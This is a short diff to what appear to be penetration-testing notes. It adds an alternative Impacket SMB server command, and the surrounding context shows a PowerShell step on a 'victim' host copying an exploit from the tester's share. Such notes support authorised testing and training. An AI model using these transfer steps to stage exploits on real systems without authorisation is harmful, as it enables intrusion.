@@ -102,6 +102,11 @@ First create the server:
 zero@pio$ sudo impacket-smbserver share -smb2support /tmp/smbshare
 ```
 
+Or:
+```console
+zero@pio$ sudo smbserver.py -smb2support CompData /tmp
+```
+
 Then copy it:
 ```console
 PS C:\victim> copy \\<your ip>\share\<exploit>
